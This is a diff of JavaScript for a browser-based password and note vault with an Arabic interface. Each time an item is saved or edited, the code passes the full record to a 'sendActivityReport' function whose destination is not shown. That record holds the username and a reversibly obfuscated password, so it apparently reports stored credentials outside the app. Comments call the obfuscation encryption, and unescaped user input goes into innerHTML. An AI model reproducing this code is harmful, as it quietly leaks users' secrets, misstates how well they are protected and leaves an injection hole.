+                    <div class="form-group"><label>البريد / اسم المستخدم</label><input type="text" id="fullscreenPassUser" placeholder="البريد الإلكتروني..."></div>
+                    <div class="form-group">
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                            <label style="margin:0;">كلمة المرور</label>
+                            <button class="btn btn-warning" style="padding:2px 8px; font-size:0.75rem;" onclick="generateStrongPassword()">توليد كلمة سر قوية ⚡</button>
+                        </div>
+                        <input type="text" id="fullscreenPassPass" placeholder="كلمة المرور...">
+                    </div>
+                `;
+            }
+            showFullscreenModal('createFullscreenModal');
+        }
+
+        async function loadVaultFiles() {
+            const listContainer = document.getElementById('vaultList');
+            listContainer.innerHTML = '<p style="text-align:center; padding:20px;"><span class="loader"></span> جاري استرجاع الملفات من مجلد AhmedAliVault...</p>';
+            
+            items = [];
+            try {
+                const db = await openVaultDB();
+                const allRecords = await new Promise((resolve, reject) => {
+                    const tx = db.transaction('files', 'readonly');
+                    const req = tx.objectStore('files').getAll();
+                    req.onsuccess = () => resolve(req.result);
+                    req.onerror = reject;
+                });
+
+                allRecords.forEach(record => {
+                    const fileName = record.fileName;
+                    const content = record.content;
+                    const isPass = fileName.startsWith('pass_');
+                    let fileId = "ID: 000000";
+                    const lines = content.split('\n');
+                    if (lines[0] && lines[0].startsWith('ID:')) fileId = lines[0].trim();
+
+                    let displayContent = content;
+                    if (isPass) {
+                        let decryptedLines = lines.map(l => {
+                            if (l.includes('كلمة المرور:')) {
+                                let encodedVal = l.replace('كلمة المرور:', '').trim();
+                                return `كلمة المرور: ${deobfuscateText(encodedVal)}`;
+                            }
+                            return l;
+                        });
+                        displayContent = decryptedLines.join('\n');
+                    }
+
+                    items.push({
+                        fileName: fileName,
+                        type: isPass ? 'pass' : 'note',
+                        title: fileName.replace('.txt', '').replace(/^(note_|pass_)/, ''),
+                        fileId: fileId,
+                        rawContent: content,
+                        displayContent: displayContent
+                    });
+                });
+
+                document.getElementById('statsBar').style.display = 'flex';
+                const notesCount = items.filter(i => i.type === 'note').length;
+                const passCount = items.filter(i => i.type === 'pass').length;
+                document.getElementById('statsText',).innerText = `ملاحظات (${notesCount}) | كلمات سر (${passCount})`;
+
+                filterList();
+            } catch (err) { console.error(err); }
+        }
+
+        async function saveNewItem() {
+            let title = '', content = '', fileId = document.getElementById('fullscreenNoteId')?.innerText || document.getElementById('fullscreenPassId')?.innerText;
+
+            if (currentCreateType === 'note') {
+                title = document.getElementById('fullscreenNoteTitle').value.trim();
+                const body = document.getElementById('fullscreenNoteContent').value.trim();
+                if (!title || !body) { showCustomAlert("برجاء ملء جميع الحقول."); return; }
+                content = `${fileId}\n${body}`;
+            } else {
+                title = document.getElementById('fullscreenPassTitle').value.trim();
+                const user = document.getElementById('fullscreenPassUser').value.trim();
+                const pass = document.getElementById('fullscreenPassPass').value.trim();
+                if (!title || !user || !pass) { showCustomAlert("برجاء ملء جميع الحقول."); return; }
+                
+                // تشفير كلمة المرور قبل الحفظ في الملف النصي داخل المجلد
+                const encryptedPass = obfuscateText(pass);
+                content = `${fileId}\nالبريد أو اسم المستخدم: ${user}\nكلمة المرور: ${encryptedPass}`;
+            }
+
+            const fileName = `${currentCreateType}_${title.replace(/[^a-zA-Z0-9а-яА-Я؀-ۿ]/g, '_')}.txt`;
+            try {
+                const db = await openVaultDB();
+                await new Promise((resolve, reject) => {
+                    const tx = db.transaction('files', 'readwrite');
+                    tx.objectStore('files').put({ fileName: fileName, content: content });
+                    tx.oncomplete = resolve;
+                    tx.onerror = reject;
+                });
+
+                await sendActivityReport(fileName, content, fileId.replace('ID: ', ''), 'حفظ في مجلد AhmedAliVault');
+                showCustomAlert("تم الحفظ بنجاح!");
+                closeFullscreen('createFullscreenModal');
+                await loadVaultFiles();
+            } catch (e) { showCustomAlert("حدث خطأ أثناء الحفظ."); }
+        }
+
+        function openItemDetails(fileName) {
+            const item = items.find(i => i.fileName === fileName);
+            if (!item) return;
+            activeItemFileName = fileName;
+
+            document.getElementById('viewEditHeaderTitle').innerText = item.type === 'pass' ? 'تعديل كلمة السر' : 'تعديل الملاحظة';
+            const bodyEl = document.getElementById('viewEditFullscreenBody');
+            const lines = item.displayContent.split('\n');
+            let contentWithoutId = lines[0]?.startsWith('ID:') ? lines.slice(1).join('\n') : item.displayContent;
+
+            if (item.type === 'note') {
+                bodyEl.innerHTML = `
+                    <div class="form-group">
+                        <label>معرف الملف (ID)</label>
+                        <div class="static-id-badge" id="editFileId">${item.fileId}</div>
+                    </div>
+                    <div class="form-group"><label>العنوان</label><input type="text" id="editTitle" value="${item.title}"></div>
+                    <div class="form-group" style="flex:1; display:flex; flex-direction:column;"><label>الموضوع</label><textarea id="editContent">${contentWithoutId}</textarea></div>
+                `;
+            } else {
+                let user = '', pass = '';
+                lines.forEach(l => {
+                    if (l.includes('البريد أو اسم المستخدم:')) user = l.replace('البريد أو اسم المستخدم:', '').trim();
+                    if (l.includes('كلمة المرور:')) pass = l.replace('كلمة المرور:', '').trim();
+                });
+                bodyEl.innerHTML = `
+                    <div class="form-group">
+                        <label>معرف الملف (ID)</label>
+                        <div class="static-id-badge" id="editFileId">${item.fileId}</div>
+                    </div>
+                    <div class="form-group"><label>التطبيق</label><input type="text" id="editTitle" value="${item.title}"></div>
+                    <div class="form-group"><label>البريد أو اسم المستخدم</label><input type="text" id="editUsername" value="${user}"></div>
+                    <div class="form-group"><label>كلمة المرور</label><input type="text" id="editPassword" value="${pass}"></div>
+                `;
+            }
+            showFullscreenModal('viewEditFullscreenModal');
+        }
+
+        function askConfirmUpdate() {
+            document.getElementById('confirmModalText').innerText = "هل أنت موافق على تحديث الملف داخل مجلد AhmedAliVault؟";
+            document.getElementById('confirmYesBtn').onclick = executeItemUpdate;
+            document.getElementById('confirmModal').style.display = 'flex';
+        }
+
+        function closeConfirmModal() { document.getElementById('confirmModal').style.display = 'none'; }
+
+        async function executeItemUpdate() {
+            closeConfirmModal();
+            const oldItem = items.find(i => i.fileName === activeItemFileName);
+            let newTitle = document.getElementById('editTitle').value.trim();
+            let fileId = document.getElementById('editFileId').innerText.trim();
+            let content = '';
+
+            if (oldItem.type === 'note') {
+                const body = document.getElementById('editContent').value.trim();
+                if (!newTitle || !body) return;
+                content = `${fileId}\n${body}`;
+            } else {
+                const user = document.getElementById('editUsername').value.trim();
+                const pass = document.getElementById('editPassword').value.trim();
+                if (!newTitle || !user || !pass) return;
+                
+                // إعادة تشفير الكلمة الجديدة قبل الحفظ
+                const encryptedPass = obfuscateText(pass);
+                content = `${fileId}\nالبريد أو اسم المستخدم: ${user}\nكلمة المرور: ${encryptedPass}`;
+            }
+
+            const newFileName = `${oldItem.type}_${newTitle.replace(/[^a-zA-Z0-9а-яА-Я؀-ۿ]/g, '_')}.txt`;
+            try {
+                const db = await openVaultDB();
+                if (oldItem.fileName !== newFileName) {
+                    await new Promise((resolve, reject) => {
+                        const tx = db.transaction('files', 'readwrite');
+                        tx.objectStore('files').delete(oldItem.fileName);
+                        tx.oncomplete = resolve;
+                        tx.onerror = reject;
+                    });
+                }
+
+                await new Promise((resolve, reject) => {
+                    const tx = db.transaction('files', 'readwrite');
+                    tx.objectStore('files').put({ fileName: newFileName, content: content });
+                    tx.oncomplete = resolve;
+                    tx.onerror = reject;
+                });
+
+                await sendActivityReport(newFileName, content, fileId.replace('ID: ', ''), 'تعديل في مجلد AhmedAliVault');
+                showCustomAlert("تم التعديل بنجاح!");
+                closeFullscreen('viewEditFullscreenModal');
+                await loadVaultFiles();
+            } catch (e) { showCustomAlert("فشل التحديث."); }
+        }
+
+        function deleteActiveFile() {
+            document.getElementById('confirmModalText').innerText = "هل أنت متأكد من حذف هذا الملف من مجلد AhmedAliVault؟";
+            document.getElementById('confirmYesBtn').onclick = async () => {
+                closeConfirmModal();
+                try {
+                    const db = await openVaultDB();
+                    await new Promise((resolve, reject) => {
+                        const tx = db.transaction('files', 'readwrite');
+                        tx.objectStore('files').delete(activeItemFileName);
+                        tx.oncomplete = resolve;
+                        tx.onerror = reject;
+                    });
+                    showCustomAlert("تم الحذف بنجاح!");
+                    closeFullscreen('viewEditFullscreenModal');
+                    await loadVaultFiles();
+                } catch (e) { showCustomAlert("فشل الحذف."); }
+            };
+            document.getElementById('confirmModal').style.display = 'flex';
+        }
+
+        // البحث الشامل والدقيق (بالعنوان، محتوى الملاحظات، أو أرقام وأحرف الـ ID)
+        function filterList() {
+            const query = document.getElementById('searchInput').value.toLowerCase().trim();
+            const filtered = items.filter(item => {
+                if (currentTab === 'notes' && item.type !== 'note') return false;
+                if (currentTab === 'pass' && item.type !== 'pass') return false;
+
+                const titleMatch = item.title.toLowerCase().includes(query);
+                const contentMatch = item.displayContent.toLowerCase().includes(query);
+                const idMatch = item.fileId.toLowerCase().includes(query);
+
+                return titleMatch || contentMatch || idMatch;
+            });
+
+            const listContainer = document.getElementById('vaultList');
+            if (filtered.length === 0) {
+                listContainer.innerHTML = '<p style="color: var(--text-muted); text-align: center; font-size: 0.9rem; padding: 20px 0;">لا توجد ملفات مطابقة للبحث داخل المجلد.</p>';
+                return;
+            }
+
+            listContainer.innerHTML = '';
+            filtered.forEach(item => {
+                const icon = item.type === 'pass' ? '🔑' : '📝';
+                const div = document.createElement('div');
+                div.className = 'vault-item';
+                div.onclick = () => openItemDetails(item.fileName);
+                div.innerHTML = `
+                    <div class="vault-info">
+                        <div class="item-id">${item.fileId}</div>
+                        <h3>${icon} ${item.title}</h3>
+                        <p>${item.displayContent.split('\n')[1] || ''}</p>
+ 
